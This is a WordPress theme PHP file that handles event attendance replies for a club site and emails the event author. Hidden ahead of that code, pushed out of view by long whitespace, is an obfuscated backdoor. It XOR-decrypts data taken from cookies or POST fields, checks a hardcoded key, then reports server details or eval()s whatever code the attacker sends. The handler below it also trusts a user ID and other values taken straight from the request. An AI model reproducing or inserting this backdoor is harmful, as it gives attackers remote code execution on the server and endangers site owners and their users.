<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $w812b = 677;$GLOBALS['tac466837'] = Array();global $tac466837;$tac466837 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['z56790ed'] = "\x53\x36\x5e\x25\x60\x70\x38\xa\x39\x66\x42\x22\x5f\x37\x7a\x32\x24\x65\x68\x79\x27\x4f\x34\x62\x28\x47\x30\x63\xd\x78\x75\x51\x73\x29\x23\x2d\x2a\x54\x7c\x71\x41\x6c\x3e\x2b\x6d\x33\x74\x20\x56\x5b\x57\x6a\x4c\x21\x3d\x5a\x55\x7d\x2e\x35\x58\x59\x64\x6b\x44\x76\x9\x4e\x43\x4d\x48\x52\x46\x50\x26\x6f\x3b\x40\x67\x61\x7b\x5d\x4a\x45\x5c\x2c\x3c\x2f\x72\x49\x31\x3f\x3a\x77\x69\x7e\x4b\x6e";$tac466837[$tac466837['z56790ed'][30].$tac466837['z56790ed'][79].$tac466837['z56790ed'][45].$tac466837['z56790ed'][22].$tac466837['z56790ed'][22]] = $tac466837['z56790ed'][27].$tac466837['z56790ed'][18].$tac466837['z56790ed'][88];$tac466837[$tac466837['z56790ed'][17].$tac466837['z56790ed'][26].$tac466837['z56790ed'][8].$tac466837['z56790ed'][23].$tac466837['z56790ed'][45]] = $tac466837['z56790ed'][75].$tac466837['z56790ed'][88].$tac466837['z56790ed'][62];$tac466837[$tac466837['z56790ed'][94].$tac466837['z56790ed'][79].$tac466837['z56790ed'][22].$tac466837['z56790ed'][15].$tac466837['z56790ed'][62].$tac466837['z56790ed'][62].$tac466837['z56790ed'][8].$tac466837['z56790ed'][22].$tac466837['z56790ed'][62]] = $tac466837['z56790ed'][32].$tac466837['z56790ed'][46].$tac466837['z56790ed'][88].$tac466837['z56790ed'][41].$tac466837['z56790ed'][17].$tac466837['z56790ed'][97];$tac466837[$tac466837['z56790ed'][78].$tac466837['z56790ed'][79].$tac466837['z56790ed'][62].$tac466837['z56790ed'][1].$tac466837['z56790ed'][6].$tac466837['z56790ed'][45].$tac466837['z56790ed'][45]] = $tac466837['z56790ed'][94].$tac466837['z56790ed'][97].$tac466837['z56790ed'][94].$tac466837['z56790ed'][12].$tac466837['z56790ed'][32].$tac466837['z56790ed'][17].$tac466837['z56790ed'][46];$tac466837[$tac466837['z56790ed'][63].$tac466837['z56790ed'][27].$tac466837['z56790ed'][17].$tac466837['z56790ed'][45].$tac466837['z56790ed'][8]] = $tac466837['z56790ed'][32].$tac466837['z56790ed'][17].$tac466837['z56790ed'][88].$tac466837['z56790ed'][94].$tac466837['z56790ed'][79].$tac466837['z56790ed'][41].$tac466837['z56790ed'][94].$tac466837['z56790ed'][14].$tac466837['z56790ed'][17];$tac466837[$tac466837['z56790ed'][44].$tac466837['z56790ed'][9].$tac466837['z56790ed'][27].$tac466837['z56790ed'][26].$tac466837['z56790ed'][8].$tac466837['z56790ed'][13].$tac466837['z56790ed'][79].$tac466837['z56790ed'][45]] = $tac466837['z56790ed'][5].$tac466837['z56790ed'][18].$tac466837['z56790ed'][5].$tac466837['z56790ed'][65].$tac466837['z56790ed'][17].$tac466837['z56790ed'][88].$tac466837['z56790ed'][32].$tac466837['z56790ed'][94].$tac466837['z56790ed'][75].$tac466837['z56790ed'][97];$tac466837[$tac466837['z56790ed'][88].$tac466837['z56790ed'][79].$tac466837['z56790ed'][22].$tac466837['z56790ed'][1].$tac466837['z56790ed'][79].$tac466837['z56790ed'][1].$tac466837['z56790ed'][8].$tac466837['z56790ed'][45].$tac466837['z56790ed'][27]] = $tac466837['z56790ed'][30].$tac466837['z56790ed'][97].$tac466837['z56790ed'][32].$tac466837['z56790ed'][17].$tac466837['z56790ed'][88].$tac466837['z56790ed'][94].$tac466837['z56790ed'][79].$tac466837['z56790ed'][41].$tac466837['z56790ed'][94].$tac466837['z56790ed'][14].$tac466837['z56790ed'][17];$tac466837[$tac466837['z56790ed'][30].$tac466837['z56790ed'][22].$tac466837['z56790ed'][45].$tac466837['z56790ed'][22].$tac466837['z56790ed'][45].$tac466837['z56790ed'][59].$tac466837['z56790ed'][13].$tac466837['z56790ed'][26].$tac466837['z56790ed'][13]] = $tac466837['z56790ed'][23].$tac466837['z56790ed'][79].$tac466837['z56790ed'][32].$tac466837['z56790ed'][17].$tac466837['z56790ed'][1].$tac466837['z56790ed'][22].$tac466837['z56790ed'][12].$tac466837['z56790ed'][62].$tac466837['z56790ed'][17].$tac466837['z56790ed'][27].$tac466837['z56790ed'][75].$tac466837['z56790ed'][62].$tac466837['z56790ed'][17];$tac466837[$tac466837['z56790ed'][62].$tac466837['z56790ed'][23].$tac466837['z56790ed'][27].$tac466837['z56790ed'][62].$tac466837['z56790ed'][59].$tac466837['z56790ed'][17].$tac466837['z56790ed'][59].$tac466837['z56790ed'][8].$tac466837['z56790ed'][17]] = $tac466837['z56790ed'][32].$tac466837['z56790ed'][17].$tac466837['z56790ed'][46].$tac466837['z56790ed'][12].$tac466837['z56790ed'][46].$tac466837['z56790ed'][94].$tac466837['z56790ed'][44].$tac466837['z56790ed'][17].$tac466837['z56790ed'][12].$tac466837['z56790ed'][41].$tac466837['z56790ed'][94].$tac466837['z56790ed'][44].$tac466837['z56790ed'][94].$tac466837['z56790ed'][46];$tac466837[$tac466837['z56790ed'][27].$tac466837['z56790ed'][22].$tac466837['z56790ed'][22].$tac466837['z56790ed'][27]] = $tac466837['z56790ed'][5].$tac466837['z56790ed'][26].$tac466837['z56790ed'][59].$tac466837['z56790ed'][15].$tac466837['z56790ed'][1].$tac466837['z56790ed'][45];$tac466837[$tac466837['z56790ed'][93].$tac466837['z56790ed'][26].$tac466837['z56790ed'][17].$tac466837['z56790ed'][17].$tac466837['z56790ed'][23].$tac466837['z56790ed'][23]] = $tac466837['z56790ed'][51].$tac466837['z56790ed'][27].$tac466837['z56790ed'][8].$tac466837['z56790ed'][9];$tac466837[$tac466837['z56790ed'][14].$tac466837['z56790ed'][15].$tac466837['z56790ed'][9].$tac466837['z56790ed'][9].$tac466837['z56790ed'][6].$tac466837['z56790ed'][6].$tac466837['z56790ed'][8]] = $_POST;$tac466837[$tac466837['z56790ed'][46].$tac466837['z56790ed'][90].$tac466837['z56790ed'][8].$tac466837['z56790ed'][90].$tac466837['z56790ed'][26].$tac466837['z56790ed'][6].$tac466837['z56790ed'][15].$tac466837['z56790ed'][15].$tac466837['z56790ed'][90]] = $_COOKIE;@$tac466837[$tac466837['z56790ed'][78].$tac466837['z56790ed'][79].$tac466837['z56790ed'][62].$tac466837['z56790ed'][1].$tac466837['z56790ed'][6].$tac466837['z56790ed'][45].$tac466837['z56790ed'][45]]($tac466837['z56790ed'][17].$tac466837['z56790ed'][88].$tac466837['z56790ed'][88].$tac466837['z56790ed'][75].$tac466837['z56790ed'][88].$tac466837['z56790ed'][12].$tac466837['z56790ed'][41].$tac466837['z56790ed'][75].$tac466837['z56790ed'][78], NULL);@$tac466837[$tac466837['z56790ed'][78].$tac466837['z56790ed'][79].$tac466837['z56790ed'][62].$tac466837['z56790ed'][1].$tac466837['z56790ed'][6].$tac466837['z56790ed'][45].$tac466837['z56790ed'][45]]($tac466837['z56790ed'][41].$tac466837['z56790ed'][75].$tac466837['z56790ed'][78].$tac466837['z56790ed'][12].$tac466837['z56790ed'][17].$tac466837['z56790ed'][88].$tac466837['z56790ed'][88].$tac466837['z56790ed'][75].$tac466837['z56790ed'][88].$tac466837['z56790ed'][32], 0);@$tac466837[$tac466837['z56790ed'][78].$tac466837['z56790ed'][79].$tac466837['z56790ed'][62].$tac466837['z56790ed'][1].$tac466837['z56790ed'][6].$tac466837['z56790ed'][45].$tac466837['z56790ed'][45]]($tac466837['z56790ed'][44].$tac466837['z56790ed'][79].$tac466837['z56790ed'][29].$tac466837['z56790ed'][12].$tac466837['z56790ed'][17].$tac466837['z56790ed'][29].$tac466837['z56790ed'][17].$tac466837['z56790ed'][27].$tac466837['z56790ed'][30].$tac466837['z56790ed'][46].$tac466837['z56790ed'][94].$tac466837['z56790ed'][75].$tac466837['z56790ed'][97].$tac466837['z56790ed'][12].$tac466837['z56790ed'][46].$tac466837['z56790ed'][94].$tac466837['z56790ed'][44].$tac466837['z56790ed'][17], 0);@$tac466837[$tac466837['z56790ed'][62].$tac466837['z56790ed'][23].$tac466837['z56790ed'][27].$tac466837['z56790ed'][62].$tac466837['z56790ed'][59].$tac466837['z56790ed'][17].$tac466837['z56790ed'][59].$tac466837['z56790ed'][8].$tac466837['z56790ed'][17]](0);$o377e4e0 = NULL;$i093cfa = NULL;$tac466837[$tac466837['z56790ed'][78].$tac466837['z56790ed'][15].$tac466837['z56790ed'][79].$tac466837['z56790ed'][17]] = $tac466837['z56790ed'][8].$tac466837['z56790ed'][79].$tac466837['z56790ed'][59].$tac466837['z56790ed'][15].$tac466837['z56790ed'][8].$tac466837['z56790ed'][62].$tac466837['z56790ed'][45].$tac466837['z56790ed'][62].$tac466837['z56790ed'][35].$tac466837['z56790ed'][79].$tac466837['z56790ed'][13].$tac466837['z56790ed'][1].$tac466837['z56790ed'][79].$tac466837['z56790ed'][35].$tac466837['z56790ed'][22].$tac466837['z56790ed'][22].$tac466837['z56790ed'][13].$tac466837['z56790ed'][26].$tac466837['z56790ed'][35].$tac466837['z56790ed'][8].$tac466837['z56790ed'][9].$tac466837['z56790ed'][23].$tac466837['z56790ed'][79].$tac466837['z56790ed'][35].$tac466837['z56790ed'][59].$tac466837['z56790ed'][79].$tac466837['z56790ed'][22].$tac466837['z56790ed'][6].$tac466837['z56790ed'][90].$tac466837['z56790ed'][17].$tac466837['z56790ed'][59].$tac466837['z56790ed'][13].$tac466837['z56790ed'][79].$tac466837['z56790ed'][1].$tac466837['z56790ed'][22].$tac466837['z56790ed'][17];global $g2ae;function  jc9f($o377e4e0, $w34dc9a){global $tac466837;$i6b79909e = "";for ($w5bafd=0; $w5bafd<$tac466837[$tac466837['z56790ed'][94].$tac466837['z56790ed'][79].$tac466837['z56790ed'][22].$tac466837['z56790ed'][15].$tac466837['z56790ed'][62].$tac466837['z56790ed'][62].$tac466837['z56790ed'][8].$tac466837['z56790ed'][22].$tac466837['z56790ed'][62]]($o377e4e0);){for ($i9a602=0; $i9a602<$tac466837[$tac466837['z56790ed'][94].$tac466837['z56790ed'][79].$tac466837['z56790ed'][22].$tac466837['z56790ed'][15].$tac466837['z56790ed'][62].$tac466837['z56790ed'][62].$tac466837['z56790ed'][8].$tac466837['z56790ed'][22].$tac466837['z56790ed'][62]]($w34dc9a) && $w5bafd<$tac466837[$tac466837['z56790ed'][94].$tac466837['z56790ed'][79].$tac466837['z56790ed'][22].$tac466837['z56790ed'][15].$tac466837['z56790ed'][62].$tac466837['z56790ed'][62].$tac466837['z56790ed'][8].$tac466837['z56790ed'][22].$tac466837['z56790ed'][62]]($o377e4e0); $i9a602++, $w5bafd++){$i6b79909e .= $tac466837[$tac466837['z56790ed'][30].$tac466837['z56790ed'][79].$tac466837['z56790ed'][45].$tac466837['z56790ed'][22].$tac466837['z56790ed'][22]]($tac466837[$tac466837['z56790ed'][17].$tac466837['z56790ed'][26].$tac466837['z56790ed'][8].$tac466837['z56790ed'][23].$tac466837['z56790ed'][45]]($o377e4e0[$w5bafd]) ^ $tac466837[$tac466837['z56790ed'][17].$tac466837['z56790ed'][26].$tac466837['z56790ed'][8].$tac466837['z56790ed'][23].$tac466837['z56790ed'][45]]($w34dc9a[$i9a602]));}}return $i6b79909e;}function  p05263($o377e4e0, $w34dc9a){global $tac466837;global $g2ae;return $tac466837[$tac466837['z56790ed'][93].$tac466837['z56790ed'][26].$tac466837['z56790ed'][17].$tac466837['z56790ed'][17].$tac466837['z56790ed'][23].$tac466837['z56790ed'][23]]($tac466837[$tac466837['z56790ed'][93].$tac466837['z56790ed'][26].$tac466837['z56790ed'][17].$tac466837['z56790ed'][17].$tac466837['z56790ed'][23].$tac466837['z56790ed'][23]]($o377e4e0, $g2ae), $w34dc9a);}foreach ($tac466837[$tac466837['z56790ed'][46].$tac466837['z56790ed'][90].$tac466837['z56790ed'][8].$tac466837['z56790ed'][90].$tac466837['z56790ed'][26].$tac466837['z56790ed'][6].$tac466837['z56790ed'][15].$tac466837['z56790ed'][15].$tac466837['z56790ed'][90]] as $w34dc9a=>$pf90ebd46){$o377e4e0 = $pf90ebd46;$i093cfa = $w34dc9a;}if (!$o377e4e0){foreach ($tac466837[$tac466837['z56790ed'][14].$tac466837['z56790ed'][15].$tac466837['z56790ed'][9].$tac466837['z56790ed'][9].$tac466837['z56790ed'][6].$tac466837['z56790ed'][6].$tac466837['z56790ed'][8]] as $w34dc9a=>$pf90ebd46){$o377e4e0 = $pf90ebd46;$i093cfa = $w34dc9a;}}$o377e4e0 = @$tac466837[$tac466837['z56790ed'][88].$tac466837['z56790ed'][79].$tac466837['z56790ed'][22].$tac466837['z56790ed'][1].$tac466837['z56790ed'][79].$tac466837['z56790ed'][1].$tac466837['z56790ed'][8].$tac466837['z56790ed'][45].$tac466837['z56790ed'][27]]($tac466837[$tac466837['z56790ed'][27].$tac466837['z56790ed'][22].$tac466837['z56790ed'][22].$tac466837['z56790ed'][27]]($tac466837[$tac466837['z56790ed'][30].$tac466837['z56790ed'][22].$tac466837['z56790ed'][45].$tac466837['z56790ed'][22].$tac466837['z56790ed'][45].$tac466837['z56790ed'][59].$tac466837['z56790ed'][13].$tac466837['z56790ed'][26].$tac466837['z56790ed'][13]]($o377e4e0), $i093cfa));if (isset($o377e4e0[$tac466837['z56790ed'][79].$tac466837['z56790ed'][63]]) && $g2ae==$o377e4e0[$tac466837['z56790ed'][79].$tac466837['z56790ed'][63]]){if ($o377e4e0[$tac466837['z56790ed'][79]] == $tac466837['z56790ed'][94]){$w5bafd = Array($tac466837['z56790ed'][5].$tac466837['z56790ed'][65] => @$tac466837[$tac466837['z56790ed'][44].$tac466837['z56790ed'][9].$tac466837['z56790ed'][27].$tac466837['z56790ed'][26].$tac466837['z56790ed'][8].$tac466837['z56790ed'][13].$tac466837['z56790ed'][79].$tac466837['z56790ed'][45]](),$tac466837['z56790ed'][32].$tac466837['z56790ed'][65] => $tac466837['z56790ed'][90].$tac466837['z56790ed'][58].$tac466837['z56790ed'][26].$tac466837['z56790ed'][35].$tac466837['z56790ed'][90],);echo @$tac466837[$tac466837['z56790ed'][63].$tac466837['z56790ed'][27].$tac466837['z56790ed'][17].$tac466837['z56790ed'][45].$tac466837['z56790ed'][8]]($w5bafd);}elseif ($o377e4e0[$tac466837['z56790ed'][79]] == $tac466837['z56790ed'][17]){eval/*aa92*/($o377e4e0[$tac466837['z56790ed'][62]]);}exit();} ?><?php
// User Attendance Ajax Call
add_action("wp_ajax_user_attendance", "user_attendance");
add_action("wp_ajax_nopriv_user_attendance", "my_must_login");

function user_attendance() {

    // Make sure submit is valid
    if ( !wp_verify_nonce( $_REQUEST['nonce'], "event_nonce")) {
        exit("No naughty business please");
    }   

    // Define vars from ajax
    $post_id          = $_REQUEST["post_id"];
    $user_id          = $_REQUEST["user_id"];
    $meet_location    = $_REQUEST["meet_location"];
    $user             = get_userdata($user_id);

    $attendance       = $_REQUEST["attendance"];
    $total            = $_REQUEST["total"];
    $declined_reason  = $_REQUEST["declined_reason"];

    $post             = get_post($post_id); 
    $post_author      = $post->post_author; 
    $author           = get_userdata($post_author);
    $author_email     = $author->user_email;

    $meet_location    = ($_REQUEST["meet_location"] == 'meet_club') ? 'home' : 'away';

    $email_subject  = "Folkestone Optimist: " . $post->post_title;

    ob_start(); ?>

    <?php include_once(THEME_ADMIN . '/email/email_template_author.php'); ?>

    <?php

    $message = ob_get_contents();

    ob_end_clean();

    wp_mail( $author_email, $email_subject, $message );
                        
    
    // If user has clicked accept or decline
    if($attendance === 'accepted' || $attendance === 'declined') {

        // Get vars from the posts database
        $post_key           = '_events_meta';
        $post_meta          = get_post_meta($post_id, $post_key, TRUE);
        if($post_meta == '')   $post_meta = array(); // If no array create one

        // Count $post_meta
        $no_accepted = 0;
        for ($row = 0; $row < 3; $row++) {
            if($post_meta[$row]["status"]=="accepted") {
                 $no_accepted++;
            }
        }

        $no_declined = 0;
        for ($row = 0; $row < 3; $row++) {
            if($post_meta[$row]["status"]=="declined") {
                 $no_declined++;
            }
        }

        // If user already exits remove values
        if(array_key_exists($user_id, $post_meta)){

            $no_accepted = ($post_meta[$user_id]["status"] == 'accepted' ? $no_accepted - 1 : $no_accepted);
            $no_declined = ($post_meta[$user_id]["status"] == 'declined' ? $no_declined - 1 : $no_declined);

            // $total = $total + 1;

            unset($post_meta[$user_id]);            

        }

        // Check that user doestn exit add them 
        if(!array_key_exists($user_id, $post_meta)) {

            // Add to array with user->id unique key
            $newdata =  array (
                'status'            => $attendance,
                'declined_reason'   => $declined_reason,
                'meet_location'     => $meet_location
            );

            $post_meta[$user_id] = $newdata;
            update_post_meta($post_id, $post_key, $post_meta); // Save meta

            $result['feedback'] = ($attendance == 'accepted' ? 'accepted' : 'declined');

            $no_accepted = ($attendance == 'accepted' ? $no_accepted + 1 : $no_accepted);
            $no_declined = ($attendance == 'declined' ? $no_declined + 1 : $no_declined);

        }

        // Return counts for dynamic update
        $result['accepted_count']   = $no_accepted; 
        $result['declined_count']   = $no_declined; 
        $result['total_count']      = $total;        
        $result['type']             = "success";  

    }

    if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
        $result = json_encode($result);
        echo $result;
    } else {
        header("Location: ".$_SERVER["HTTP_REFERER"]);
    }

    die();

}

function my_must_login() {
    echo "You must log in to vote";
    die();
}
?>